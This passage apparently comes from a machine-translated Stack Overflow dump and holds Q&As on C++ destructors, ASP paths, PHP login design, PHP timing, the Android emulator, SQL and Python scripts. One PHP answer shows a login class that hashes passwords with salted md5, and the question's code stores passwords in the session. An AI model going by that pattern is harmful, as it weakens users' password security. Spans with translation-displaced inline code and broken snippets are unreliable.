#include <string>
struct Base;

struct Member {
  Member(Base *b);
  ~Member();
  Base *b_;
};

struct Base {
  virtual void f() {}
  virtual ~Base() {}
};

struct Derived : Base {
  Derived() : m(this) {}
  virtual ~Derived() {}  
  virtual void f() {}
  std::string s; 
  Member m;
};

Member::Member(Base *b) : b_(b) {}
Member::~Member() {
  // At this point, ~Derived has finished -- can we use b_ as a 
  // Derived* object (i.e. call Derived::f or access Derived::s)?
  b_->f();
}

int main() {
  Base *bd = new Derived;
  delete bd;
} 
```

在这个例子中，一个`Member`对象有一个指向`Derived`拥有它的对象的指针，并且它试图在`Derived`它被破坏时访问该对象......即使析构函数 for`Derived`已经完成。

如果某个子对象在执行之后但在执行之前`*bd`调用了虚函数，则将调用哪个版本的虚函数？在那个状态下访问是否合法？`~Derived()``~Base()``*bd`

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-06-27T22:07:54.373

对我来说，从 [12.4] 清楚地表明，这是不合法的：

> **一旦为对象调用析构函数，该对象就不再存在；**如果为生命周期已结束的对象调用析构函数（3.8），则行为未定义。[例子： ...]

尽管*没有不再存在*的定义，但我认为，我可以说引用*不再存在*的对象会导致**未定义的行为**。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-27T22:03:10.387

在您调用的那一刻，`b_->f()`正在`Derived`被破坏，但`Base`尚未被破坏。不过，您仍然处于不确定状态，因为`Derived::f()`您将要打电话。

编辑：

> 成员函数，包括虚函数 (10.3)，可以在构造或销毁 (12.6.2) 期间调用。当从构造函数（包括从数据成员的 mem-initializer）或从析构函数直接或间接调用虚函数时，调用应用的对象是正在构造或销毁的对象，调用的函数是在构造函数或析构函数自己的类或其基类之一中定义的函数，但不是在派生自构造函数或析构函数类的类中覆盖它的函数，或在最派生对象的其他基类之一中覆盖它的函数（1.8 ）。如果虚函数调用使用显式类成员访问（5.2.

[C++0x 工作草案 Sec 12.7 par 4](http://www.open-std.org/jtc1/sc22/wg21/docs/papers/2005/n1804.pdf)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-06-28T00:30:33.510

来自 n3290 [class.cdtor]

12.7 构造和销毁 1 对于具有非平凡构造函数的对象，在构造函数开始执行之前引用对象的任何非静态成员或基类会导致未定义的行为。**对于具有非平凡析构函数的对象，在析构函数完成执行后引用对象的任何非静态成员或基类会导致未定义的行为。**

# asp-classic - Server.MapPath 不喜欢 ~/ 和 ./

> ID：11235358
> 
> 赞同：0
> 
> 时间：2012-06-27T21:56:45.113
> 
> 标签：asp-classic, vbscript

我正在使用以下代码尝试从我的代码文件中查找另一个目录中包含的文件。

```
Set fi=fs.OpenTextFile(Server.MapPath("~/counter/counter.txt"), 1) 
```

我也试过了。

```
Set fi=fs.OpenTextFile(Server.MapPath("./root/folder1/counter/counter.txt"), 1) 
```

无论哪种情况，这都应该让我回到 counter.txt 文件。据我了解 ~/ 向上移动 1 个目录， ./ 向上移动到根目录。

但是，这两次我都收到错误消息，指出使用了无效字符。删除这些时，我得到一个不同的错误，指出找不到路径（我希望这是因为它不是有效路径而不向上移动 1 个目录）。

在 VBscript 中执行以下操作的有效字符是什么：向上移动单个目录？向上移动到根目录？

谢谢您的帮助

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-06-27T23:09:04.477

一些东西：

波浪号“~”在这里无效。

单句点字符“.” 用于指定当前目录/文件夹。

一组句点字符“..”用于指定父目录/文件夹。例如，要引用在当前目录的父目录中找到的文件，您可以使用：

```
Server.MapPath("../counter.txt") 
```

您可以将这些链接起来以向上走多条父路径。要引用在当前目录上方三个目录中找到的文件，您可以使用：

```
Server.MapPath("../../../counter.txt") 
```

[MapPath](http://msdn.microsoft.com/en-us/library/ms524632%28v=vs.90%29.aspx)函数的 MSDN 文档对此进行了概述。如果您希望能够引用当前目录上方的相对路径，请注意此处列出的有关[启用父路径的警告。](http://msdn.microsoft.com/en-us/library/ms524697%28v=vs.90%29.aspx)如果您在尝试引用父路径时遇到错误，则说明您没有启用父路径。

# opencv - 将mingw与opencv一起使用——初始化错误

> ID：11235359
> 
> 赞同：0
> 
> 时间：2012-06-27T21:56:46.210
> 
> 标签：opencv, mingw, eclipse-cdt

我使用 Eclipse CDT 用 mingw 开发 C。我还添加了 opencv 库。一切编译没有问题。但是，如果我启动编译的应用程序（使用 opencv 函数），则会出现初始化错误。如果我只包含 .h 文件而不使用它的功能。

编码：

```
#include <opencv2/opencv.hpp>
using namespace std;

int main() {
    cout << "!!!Streaming!!!" << endl; // prints !!!Streaming!!!
    // Nothing but create a window
    cvNamedWindow("mainWin", CV_WINDOW_AUTOSIZE);
    cvMoveWindow("mainWin", 100, 100);
    cvWaitKey(0);
    return 0;
} 
```

错误图像：http: [//i.stack.imgur.com/zdmT7.png](http://i.stack.imgur.com/zdmT7.png)

如果我不使用 cv.. - 函数，则不会出现初始化错误。即使我包含 opencv2/opencv.hpp

我不知道它是如何工作的。

希望你能帮忙。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-29T09:25:26.547

我找到了解决方案。mingw 的 opencv-dll 文件已损坏。我将visualstudio dll重命名为mingw-dll的名称，并将其直接放入exe文件夹中，它可以工作。

# windows - 哪个 Windows Shell 命令将在标准输出上打印文件内容（如 Linux 中的 cat）？

> ID：11235362
> 
> 赞同：7
> 
> 时间：2012-06-27T21:57:04.810
> 
> 标签：windows, shell, cat

哪个 Windows Shell 命令将在标准输出上打印文件内容（如 Linux 中的 cat）？

使用 Google、Stackoverflow 等，我只是找不到解决方案，但我敢肯定，有一个简单的解决方案。

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-06-27T21:58:22.493

命令是：`type <filename>`

但是，如果您想对您的 Windows shell 进行 Unix-fy，则大多数命令 Unix 样式命令都有[Win32 端口](http://unxutils.sourceforge.net/)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2017-02-24T02:36:05.153

这有点hacky，但我做到了......

下载适用于 Windows 的 Git Bash。这对于在 Windows 上打开 linux 风格的命令提示符非常有用。

然后，创建一个新的 git 存储库并将您希望显示的文件添加到 git 存储库。然后你可以 git 显示。

假设您有要显示的 testFile.txt，它位于“C:\Users\username\Desktop\FolderWhereFileIs”

```
cd "/c/Users/username/Desktop/FolderWhereFileIs/"
git add -A
git commit -m "Commit with all files"
git show testFile.txt 
```

# php - php中面向对象登录系统的类设计

> ID：11235365
> 
> 赞同：5
> 
> 时间：2012-06-27T21:57:22.243
> 
> 标签：php, oop, login-system

在构建网站时，我已经开始通过解决一些相当简单的问题来提高我的 OOP 技能。所以它从一个登录系统开始，我遵循了 youtube 上的一个教程，它帮助我制作了一个登录类，但随着它的继续，它提出了很多疑问（顺便说一句。代码是 100 行，所以我会继续粘贴它）。

因此，在这个 Login 类中，有验证方法等，但到了有会话验证的地步，在构造中给出了 before 参数，它不能被使用（至少在这个类范围内）：

```
 $this->_username = ($this->_login)? $this->filter($_POST['username']) : $_SESSION['username'];
    $this->_password = ($this->_login)? $this->filter($_POST['password']) : '';
    $this->_passmd5 = ($this->_login)? md5($this->_password) : $_SESSION['password']; 
```

因此，在这种情况下，我不能使用 verifySession() 方法，当没有设置会话变量时（例如，区分登录用户应该在主页上看到的内容）。

所以我的问题是 - 设计是否正确，我应该如何构建登录系统的其余部分：在每个页面上登录验证并注销 - 他们每个人是否应该在单独的类中（以及在特定类中重复的方法呢？ ，我应该总是继承它们）。我意识到 OOP 有不同的方法，但是作为初学者我应该遵循什么特别的方法（这将帮助我更好地理解 oop）。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-27T22:54:14.710

我不确定你真的想要一个“登录”课程。你可能会做这样的事情

```
class User
{
   private $username;
   private $password;

   public function __construct($username)
   {
     //load this user object here
   }

   private function hashPassword($password)
   {
      ///Dont do this has the hash, but im just keeping it simple
      return md5($password . 'a}{!@#' . $this->username);

   }

   public function authenticate ($password)
   {
      return $this->hashPassword($password) == $this->password;
   }

} 
```

登录.php

```
$user = new User($_POST['username']);
if($user->authenticate($_POST['password']))
{
 //do session initilization here (can be a class, or whatever)
 Session::createUserSession($user)
}
else
 echo 'bad login'; 
```

注销.php

```
Session::destroyUserSession(); 
```

这种设计可能不是最好的方法，但可能会给你一个想法。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-06-28T14:07:42.500

“我已经按照 youtube 上的教程进行操作”是第一个问题。仅您粘贴的三行代码就表明您观看的视频是由业余 PHP 开发人员创建的。

> “所以我的问题是 - 设计是否正确，我应该如何构建登录系统的其余部分”

由于只贴了三行，不知道设计对不对。我敢打赌那不是。

何时使用对象的一个​​好的经验法则是，当代码明显先进到需要两个以上的函数时，将在应用程序的多个位置使用，并且如果代码不存在命名冲突的可能性很大。 t 封装在对象或命名空间中。这不符合该标准 - 登录和注册屏幕各有一个页面（最多），因此该代码将被使用一次。没有理由封装该逻辑。Niko 提到了 Session 和 User 类，它们是常见的模式，可以封装。

至于构建登录系统，它们很快变得复杂，并且这些天几乎是专业化的。我建议阅读以下 SO wiki 文章：

[基于表单的网站身份验证权威指南](https://stackoverflow.com/questions/549/the-definitive-guide-to-forms-based-website-authentication/)

如果您想要一个遵循上述 wiki 文章的预打包系统，您可以查看：

[http://barebonescms.com/documentation/sso/](http://barebonescms.com/documentation/sso/)

SSO 客户端不向应用程序提供类 - 只是一组函数，例如 SSO_LoggedIn()、SSO_Login()、SSO_Logout() 等。当更简单的事情就足够了时，为了执行 OOP 而执行 OOP 是错误的编写软件的方法。有时功能更好。有时内联代码会更好。这真的取决于，需要多年的经验才能洞察什么是最好的方法。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2017-06-22T11:05:06.593

`$_SESSION['password']`

永远不需要在会话中存储密码（纯文本？）。您应该检查是否允许用户登录，如果他这样做并提供正确的密码，则您在会话中存储的内容不超过“已登录”。为方便起见，您也可以存储 user-id 的用户名。

但是在您将其与数据库中的密码进行比较后，就不需要密码了。

# c# - 获取 Razor 网页中的 HTML Dropdownlist 选定项

> ID：11235367
> 
> 赞同：1
> 
> 时间：2012-06-27T21:57:29.580
> 
> 标签：c#, html, razor, asp.net-webpages

我在弄清楚如何在我的 HTML.DropDownList 中返回所选项目时遇到了一些困难，以便在点击提交按钮时，将在我的数据库中查找所选项目的文本。这是我所拥有的：

```
@{
var selectStaff = "Select LastName + ', ' + FirstName AS Name, StaffID  From StaffList ORDER BY LastName";
var data = db.Query(selectStaff);
var items = data.Select(i => new SelectListItem {
    Text = i.Name
  });
} 
```

然后在 html..

```
@Html.DropDownList("Select1", items) 
```

这很好用，因为我的下拉列表正在出现并已填充，但现在点击提交按钮后，我希望能够在我的数据库中搜索所选项目的文本。我该怎么做呢？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-28T15:08:17.277

如果您不将下拉列表绑定到视图模型上的属性（这会更好），您仍然可以`Request.Form["Select1"]`在控制器操作中简单地使用它。

如果您的意思是希望能够在剃刀页面上获取该值，则需要使用[jQuery](http://jquery.com/)（或其他 javascript）来获取该值。

要使用 jQuery 获取值：

```
$(document).ready(function () {
     $("#YourSubmitButtonID").click(function () {
         // Get the value from 'Select1'
         var value = $("#Select1").val();
     });
}); 
```

要使用该值执行某些操作，您必须使用 ajax 函数，如下所示：

```
$.ajax({
    url: '@Url.Action("ActionName", "ControllerName")',
    data: { valueToQuery: $("#Select1").val() },
    success: function (data) {
       // The data is the result
    }
}); 
```

在本例中名为 ControllerName 的控制器上，您将拥有查询数据库并返回结果的代码。

```
public ActionResult ActionName(string valueToQuery)
{
     // Do your stuff here
    return Json("your result", , JsonRequestBehavior.AllowGet);
{ 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2017-12-19T09:19:38.193

我也发现[这](https://forums.asp.net/t/1767062.aspx?Html%20DropDownList%20Help%20How%20to%20link%20with%20database%20Razor%20syntax%20)很有趣，可以帮助你！

如果您不想使用 Ajax 或 Json 策略，也可以尝试以下步骤：

```
var sql = "SELECT ProductId, ProductName FROM Products";
var data = Database.Open("Northwind").Query(sql);
var items = data.Select(i => new SelectListItem {
    Value = i.ProductId.ToString(),
    Text = i.ProductName
});

@Html.DropDownList("productid", items) 
```

并且：

```
var sql = "SELECT ProductId, ProductName FROM Products";
var data = Database.Open("Northwind").Query(sql);

<select name="productid">
@foreach(var row in data){
    <option value="@row.ProductId">@row.ProductName</option>
}
</select> 
```

# php - 测量PHP中代码段之间的经过时间

> ID：11235369
> 
> 赞同：18
> 
> 时间：2012-06-27T21:57:34.650
> 
> 标签：php, time

有时，我希望能够测量两段代码之间经过的时间。这仅仅是为了能够检测代码中的瓶颈并改进可以改进的地方。

我想设计一个这样的函数，该函数应该与一个全局变量一起使用，该变量会回显当前调用和上次调用之间经过的时间。

这样，您可以一个接一个地多次使用它。

并且该函数应该能够计算以秒为单位的差异，例如 0.1 秒或 0.3 秒等。

一个例子可能会更好地解释它。

```
echo time_elapsed();   

     // This echo outputs nothing cause this is the starting case. 
     // There is nothing to compare against. 

//
// 1st code section here
//

echo time_elapsed();  

      // This echo outputs 0.5 seconds. 
      // ...which means there has been 0.5 seconds passed 
      // ...since the last time time_elapsed() was fired

//
// 2nd code section here
//

echo time_elapsed()   

      // This echo outputs 0.2 seconds

//
// 3rd code section here 
//

echo time_elapsed()   

      // This echo outputs 0.1 seconds etc 
```

我的问题是我需要使用哪些 PHP 实用程序（内置函数）来实现这种输出？

* * *

## 回答 #1

> 赞同：23
> 
> 时间：2012-06-27T22:00:53.730

像 XDebug/Zend Debugger 这样的调试器可以为您提供这种类型的洞察力（以及更多），但这里提示您如何编写这样的函数：

```
function time_elapsed()
{
    static $last = null;

    $now = microtime(true);

    if ($last != null) {
        echo '<!-- ' . ($now - $last) . ' -->';
    }

    $last = $now;
} 
```

主要是函数[microtime()](http://php.net/microtime)是您进行时间计算所需的全部。为了避免使用全局变量，我在 elapsed 函数中使用了一个静态变量。或者，您可以创建一个简单的类，该类可以封装所需的变量并调用类方法来跟踪和输出时间值。

* * *

## 回答 #2

> 赞同：15
> 
> 时间：2012-06-27T22:00:24.770

从[**php doc**](http://php.net/manual/en/function.microtime.php#example-2312) **s**中的第一个示例：

```
<?php
/**
 * Simple function to replicate PHP 5 behaviour
 */
function microtime_float()
{
    list($usec, $sec) = explode(" ", microtime());
    return ((float)$usec + (float)$sec);
}

$time_start = microtime_float();

// Sleep for a while
usleep(100);

$time_end = microtime_float();
$time = $time_end - $time_start;

echo "Did nothing in $time seconds\n"; 
```

* * *

## 回答 #3

> 赞同：9
> 
> 时间：2012-06-27T22:01:49.293

这些方面的东西应该起作用：

```
$start = microtime(true); 

// Do something
sleep(2);

$end = (microtime(true) - $start);
echo "elapsed time: $end"; 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-06-27T22:04:03.493

其他因素会影响脚本的时间安排。例子：

1.  复杂的代码和递归函数。
2.  正在使用的 Web 服务器的类型，例如：共享 VS 专用主机。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2014-06-19T22:18:39.837

相同的 draw010 函数（谢谢！），仅添加了自定义评论和时间显示，以微秒（us）为单位：

```
 function time_elapsed($comment) 
        {

        static $time_elapsed_last = null;
        static $time_elapsed_start = null;

        // $unit="s"; $scale=1000000; // output in seconds
        // $unit="ms"; $scale=1000; // output in milliseconds
        $unit="μs"; $scale=1; // output in microseconds

        $now = microtime(true);

        if ($time_elapsed_last != null) {
            echo "\n";
            echo '<!-- ';
            echo "$comment: Time elapsed: ";
            echo round(($now - $time_elapsed_last)*1000000)/$scale;
            echo " $unit, total time: ";
            echo round(($now - $time_elapsed_start)*1000000)/$scale;
            echo " $unit -->";
            echo "\n";
        } else {
            $time_elapsed_start=$now;
        }

        $time_elapsed_last = $now;
    } 
```

例子：

```
// Start timer
time_elapsed('');

// Do something
usleep(100);
time_elapsed('Now awake, sleep again');

// Do something
usleep(100);
time_elapsed('Game over'); 
```

输出：

```
<!-- Now awake, sleep again: Time elapsed: 100 us, total time: 100 us -->
<!-- Game over: Time elapsed: 100 us, total time: 200 us --> 
```

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2017-06-06T07:17:03.987

```
<?php
$time_start = microtime(true);

// Sleep for a while (or your code which you want to measure)
usleep(100);

$time_end = microtime(true);
$time = $time_end - $time_start;

echo "Did nothing in $time seconds\n"; 
```

来源： http: [//php.net/manual/en/function.microtime.php#example-2568](http://php.net/manual/en/function.microtime.php#example-2568)

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2017-12-30T20:25:35.257

这个小而强大的类涵盖了我在开发中的分析需求：

```
<?php

class perflog {
    protected $perflog = [];

    public function start($tag) {
        if (!isset($this->perflog[$tag])) $this->perflog[$tag] = 0;
        $this->perflog[$tag] -= microtime(TRUE);
    }

    public function stop($tag) {
        $this->perflog[$tag] += microtime(TRUE);
    }

    public function results() {
        return $this->perflog;
    }
} 
```

[在这里查看它的实际应用。](https://eval.in/928592)

它旨在通过后续`start(<tag>)`和调用来`stop(<tag>)`调用。它生成一个数组，其中包含您的代码在 start() 和 stop() 调用所包含的部分中花费的总时间，并带有匹配的标签。

start-stop 序列可以嵌套并且可以多次输入，从而总结了在封闭部分中花费的时间。

它的紧凑性确保了最小的性能影响。动态标签创建可用于让程序修改其监控的内容。通常，这会通过输出或存储功能进行扩展。

# android - Android 模拟器不接受键盘输入 - SDK 工具 rev 20

> ID：11235370
> 
> 赞同：332
> 
> 时间：2012-06-27T21:57:48.053
> 
> 标签：android, android-emulator

我已将 SDK 工具升级到修订版 20（从 18 版），自升级以来，模拟器似乎不接受来自笔记本电脑键盘的输入。但只能使用模拟器自己的“软”键盘（当输入字段被聚焦时出现）。

我尝试重新安装 SDK 工具（以及整个 SDK），卸载并重新安装 Eclipse Android 插件，重新创建模拟器设备。但这些似乎都没有帮助，它让我发疯。使用笔记本电脑的触控板键入是没有希望的。

有没有人遇到过这个问题？

* * *

## 回答 #1

> 赞同：477
> 
> 时间：2012-06-28T20:36:40.733

**更新**

从 SDK rev 21 开始，Android 虚拟设备管理器具有改进的 UI，可解决此问题。我在下面强调了一些更重要的配置设置：

![在此处输入图像描述](../Images/e6576ddc1321f73bee9aeed4b1294a15.png)

如果您发现模拟器中缺少软（基于屏幕的）主键`Back`、等，您可以设置为启用它们。`Home``hw.mainKeys=no`

![在此处输入图像描述](../Images/88db176db3e27c86d0298f25d70183ce.png)

**原始答案**

尽管开发人员文档说默认启用键盘支持，但在 SDK rev 20 中似乎并非如此。我在模拟器的 config.ini 文件中明确启用了键盘支持并且有效！

添加：`hw.keyboard=yes`

到：`~/.android/avd/<emulator-device-name>.avd/config.ini`

同样，`hw.dPad=yes`如果您希望使用箭头键导航应用程序列表，请添加。

参考：http: [//developer.android.com/tools/devices/managing-avds-cmdline.html#hardwareopts](http://developer.android.com/tools/devices/managing-avds-cmdline.html#hardwareopts)

在 Mac OS 和 Linux 上，您可以使用一个终端命令编辑所有模拟器配置：

`for f in ~/.android/avd/*.avd/config.ini; do echo 'hw.keyboard=yes' >> "$f"; done`

* * *

在相关说明中，如果您的平板电脑模拟器缺少 BACK/HOME 按钮，请尝试在 AVD 编辑器中选择**WXGA800**作为内置皮肤： ![在此处输入图像描述](../Images/1cfe3cc1d6c9b6f12954affc2ec7e415.png)

或者通过在 config.ini 中手动设置皮肤：

```
skin.name=WXGA800
skin.path=platforms/android-16/skins/WXGA800 
```

（示例适用于 API 16）

* * *

## 回答 #2

> 赞同：113
> 
> 时间：2012-06-29T10:11:29.967

确认的。升级到工具版本 20 后我遇到了同样的问题。我必须编辑 AVD 以添加一个选项，如下所示：

1.  从 Eclipse 转到 AVD Mananger。
2.  选择特定的 AVD 并单击编辑
3.  转到硬件部分，单击新建。
4.  选择属性名称：键盘支持
5.  默认情况下，它会添加一个值“no”。只需单击值列并将其更改为“是”。
6.  再次单击编辑 AVD。

这将在 config.ini 文件中为 AVD 添加一个属性 hw.keyboard=yes。

您还必须设置 hw.mainKeys = yes

* * *

## 回答 #3

> 赞同：60
> 
> 时间：2015-05-19T13:54:32.763

在 Android Studio 中，打开 AVD 管理器（工具 > Android > AVD 管理器）。点击模拟器的编辑按钮： ![在此处输入图像描述](../Images/edab447c9c8b14aa6ff22dc229c7cca1.png)

选择“显示高级设置” ![在此处输入图像描述](../Images/5e6102e7c39c9053969169ab297da5e3.png)

勾选“启用键盘输入” ![在此处输入图像描述](../Images/a1c7dabe55b186814d7e4ac34aa3c062.png)

单击完成并启动模拟器以享受键盘输入。

* * *

## 回答 #4

> 赞同：15
> 
> 时间：2012-06-28T18:05:16.747

在 AVD Manager 中查找，选择 AVD 并单击 Edit。在硬件部分：单击“新建”并搜索“键盘支持”并使用确定按钮添加并将值设置为“是”并使用“编辑 AVD”保存更改

* * *

## 回答 #5

> 赞同：10
> 
> 时间：2012-06-29T12:05:44.040

谷歌想让开发者更加头疼。

所以，你现在要做的是编辑你的 AVD 并在硬件部分为其添加“键盘支持”并将值更改为“是”

* * *

## 回答 #6

> 赞同：4
> 
> 时间：2013-08-25T12:18:50.907

在您的主文件夹 /.android/avd//config.ini 添加行 hw.keyboard=yes

* * *

## 回答 #7

> 赞同：3
> 
> 时间：2017-04-24T08:26:27.400

**尽管您的 Android 虚拟设备启用了键盘输入，但在无法键入时**重新启动模拟器有时会有所帮助。****

 *** * *

## 回答 #8

> 赞同：2
> 
> 时间：2014-07-02T00:06:15.493

以防万一有人发现它有用。

我对属于轨迹球的**KEYCODE_DPAD_UP有疑问。**要解决此问题，请更改您的 avdfolder/ **config.ini hw.trackBall=yes**并按 DEL 或 F6

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2018-10-01T06:54:10.097

这是一些实际上对我有用的解决方法，它与最流行的答案中的解决方案相同 - 只需将 hw.keyboard=yes 添加到 config.ini 但由于这对我**不起作用**，我另外

1.  将 config.ini （任何名称都可以）重命名为 conssssfig.ini
2.  重新启动模拟器（显然它没有启动）
3.  再次重命名 config.ini
4.  （我不确定是否相关）我在 config.ini 文件的开头添加了这个新参数（hw.keyboard=yes）

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2012-06-28T01:13:28.663

在您的用户主文件夹中查找隐藏的 .android 文件夹。您可以重命名或删除此文件夹，重新创建 AVD，然后重新启动模拟器。可能是该文件夹中有一个 .ini 文件，该文件具有该设置。

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2012-10-21T15:45:46.050

使用硬件键盘重新创建 AVD + 将布尔值设置为 true 是唯一对我有用的解决方案；其他两个主要解决方案（终端或通过 GUI 编辑现有的 AVD）都导致我的 Mac 上的软件/模拟器崩溃。制作新的 AVD 导致键盘工作正常。

* * *

## 回答 #12

> 赞同：0
> 
> 时间：2021-02-14T03:20:58.523

我使用了一个 API 级别 23 的模拟器，它不需要键盘输入来安装 apk。所以我为 API Level 29 创建了新的模拟器，然后它就可以工作了。以下是安装新模拟器的步骤。

1.  打开“Android 虚拟设备管理器”
2.  创建新的虚拟设备。
3.  选择系统镜像时，请在“虚拟设备配置”窗口选择并下载最新版本（API Level29）

* * *

## 回答 #13

> 赞同：0
> 
> 时间：2021-10-08T20:41:05.017

有时电脑键盘在安卓模拟器上停止工作。今天我注意到，按下此按钮（我用红色箭头标记）后，键盘再次开始工作（似乎是没有模拟器窗口焦点的一些问题）

[![截屏](../Images/30b203479bcdc8ade40ff7dbe4a702fd.png)](https://i.stack.imgur.com/ghfkQ.png)**

# javascript - jQuery 进度条移动

> ID：11235375
> 
> 赞同：0
> 
> 时间：2012-06-27T21:58:17.907
> 
> 标签：javascript, jquery, jquery-ui, progress-bar

我有一个 jQueryUI 进度条，在用我自己的 javascript 代码对其进行一系列移动之后，它开始快速向前和向后移动。这是相关的javascript代码：（需要控制台输入）

```
 $(document).ready(function() {
            $("#progressbar").progressbar({ value: 0 });
    });

    var pr = 0;
    var goTo = 0;
    var speedType = "fast";

    function prgMax(speed){
        speedType = speed;
        if(speedType == "slow") {
            if(pr < 101) {
                pr=pr+0.2;
                $("#progressbar").progressbar({ value: pr });
                var t = setTimeout('prgMax("slow")', 0.1);
            }
            else{ return "Moved"; clearTimeout(); }
        }
        else {
            if(pr < 101) {
                pr=pr+1;
                $("#progressbar").progressbar({ value: pr });
                var t = setTimeout(prgMax, 0.1);
            }
            else{ return "Moved"; clearTimeout(); }
        }
    }

    function prgMin(speed){
        speedType = speed;
        if(speedType == "slow") {
            if(pr > -1) {
                pr=pr-0.2;
                $("#progressbar").progressbar({ value: pr });
                var t = setTimeout('prgMin("slow")', 0.1);
            }
            else{ return "Moved"; clearTimeout(); }
        }
        else {
            if(pr > -1) {
                pr=pr-1;
                $("#progressbar").progressbar({ value: pr });
                var t = setTimeout(prgMin, 0.1);
            }
            else{ return "Moved"; clearTimeout(); }
        }
    }

    function prgSet(setting,speed){
        speedType = speed;
        goTo = setting
        if(speedType == "slow") {
            if(goTo > pr) {
                pr=pr+0.2;
                $("#progressbar").progressbar({ value: pr });
                var t = setTimeout('prgSet(goTo,speedType)',0.1);
            }
            else if(goTo < pr) {
                pr=pr-0.2;
                $("#progressbar").progressbar({ value: pr });
                var t = setTimeout('prgSet(goTo,speedType)',0.1);
            }
            else if(goTo == pr) { return "Moved"; clearTimeout(); }
        }
        else {
            if(goTo > pr) {
                pr=pr+1;
                $("#progressbar").progressbar({ value: pr });
                var t = setTimeout('prgSet(goTo,speedType)',0.1);
            }
            else if(goTo < pr) {
                pr=pr-1;
                $("#progressbar").progressbar({ value: pr });
                var t = setTimeout('prgSet(goTo,speedType)',0.1);
            }
            else if(goTo == pr) { return "Moved"; clearTimeout(); }
        }
    } 
```

还有我的 HTML

```
<div style="height:32px; display:inline-block; left:39px; right:5px; position:absolute;" id="progressbar"></div> 
```

我通过将 clearTimeout() 添加到 else if 语句来解决部分问题，但是当我将以下系列放入控制台时，进度条开始来回移动：

```
prgMax() //Wait until it's done then
prgMin("slow") //Wait until it's done then
prgSet(5,"slow") 
```

有没有人有任何想法？在此先感谢，如果有什么不明白的地方，请发表评论！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-27T23:42:38.987

您不应该使用字符串，[`setTimeout()`](https://developer.mozilla.org/en/DOM/window.setTimeout)而是使用函数。此外，`0.1`毫秒可能太短，浏览器可以处理的最小值约为 4 毫秒。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-03T13:03:41.053

I recommend to use a simple and nice progressbar. This one doesn't have jQuery and it's very easy to use: [http://ruwix.com/simple-javascript-html-css-slider-progress-bar/](http://ruwix.com/simple-javascript-html-css-slider-progress-bar/)

# mysql - SQL - 在同一行中打开两个不同的日期

> ID：11235377
> 
> 赞同：0
> 
> 时间：2012-06-27T21:58:38.093
> 
> 标签：mysql, sql

我有一个相当简单的查询：

```
SELECT invoice_id WHERE employee_id = 'XXXX' AND customer_id = 'YYYY'
    AND [date] < '2012-06-27'; 
```

我想知道是否有一种方法可以根据条件切换列 [日期]，在这种情况下是较小或最早的。

换句话说，像

```
SELECT invoice_id WHERE employee_id = 'XXXX' AND customer_id = 'YYYY'
    AND (IF(time_created <= transaction_date)) time_created < '2012-06-27' ELSE 
        transaction_date > '2012-06-27'); 
```

因此，通过比较两列来使用行中最早日期的查询（尽管似乎 time_created 应该总是最早的，但这里不是这种情况）。如果没有，我可以将查询分成两部分，但我想知道它是否可以合二为一。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-27T22:00:52.570

```
SELECT invoice_id WHERE employee_id = 'XXXX' AND customer_id = 'YYYY'
AND IF(time_created <= transaction_date, time_created < '2012-06-27', transaction_date > '2012-06-27'); 
```

或 ANSI SQL 解决方案：

```
SELECT invoice_id WHERE employee_id = 'XXXX' AND customer_id = 'YYYY'
AND CASE WHEN time_created <= transaction_date
         THEN time_created < '2012-06-27'
         ELSE transaction_date > '2012-06-27'
    END 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-06-27T22:01:07.107

您可以使用双重条件，例如：

```
and  (
    time_created <= transaction_date and time_created < '2012-06-27' or
    time_created > transaction_date and transaction_date > '2012-06-27'
) 
```

# python - 根据 Excel 电子表格中的数据打开一堆浏览器选项卡的脚本？

> ID：11235381
> 
> 赞同：0
> 
> 时间：2012-06-27T21:58:49.293
> 
> 标签：python, ruby, excel, scripting, automation

以链接格式为例：

```
www.stackoverflow.com/xxxxxxx 
```

我有一个 Excel 电子表格，其中一列是一组这些`xxxxxx`值。我需要从电子表格中提取所有这些并在我的浏览器上将它们作为新标签打开。这样做的最佳方法是什么？

我以前从未真正编写过脚本，但如果有必要，我非常愿意学习。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-27T22:56:25.893

在 python 中，`webbrowser`提取 URL 后，使用该模块打开浏览器选项卡。

要阅读 URL，您应该在 Excel 中打开电子表格并将其保存为 CSV 格式，您可以使用该`csv`模块进行阅读；`xlrd`或者安装可以读取真实 Excel 电子表格的 python 模块。假设您 install `xlrd`，您可以提取 URL 并在标签中打开它们，如下所示：

```
import xlrd, webbrowser

workbook = xlrd.open_workbook('websites.xls')
sheet = workbook.sheet_by_name('Sheet1')

# Suppose your URLs are in column 5, rows 2 to 30
url_column = 5
for row in range(2, 31):
    url = sheet.cell_value(row, url_column)
    webbrowser.open_new_tab(url) 
```

**更新：**我现在推荐[`openpyxl`](https://openpyxl.readthedocs.io/en/default/index.html)over `xlrd`/`xlwt`用于处理 Excel 文档。它可以读写`xlsx`文件，例如：

```
from openpyxl import load_workbook
wb = load_workbook(filename = 'my_document.xlsx')
sheet = wb['Sheet1']
print(sheet['D18'].value) 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-28T05:03:23.807

如果您打算在打开选项卡后对它们进行更精细的操作，我建议您查看使用 python 框架的浏览器自动化工具。

我会推荐[Selenium](http://seleniumhq.org/)网络驱动程序。它也非常易于使用。

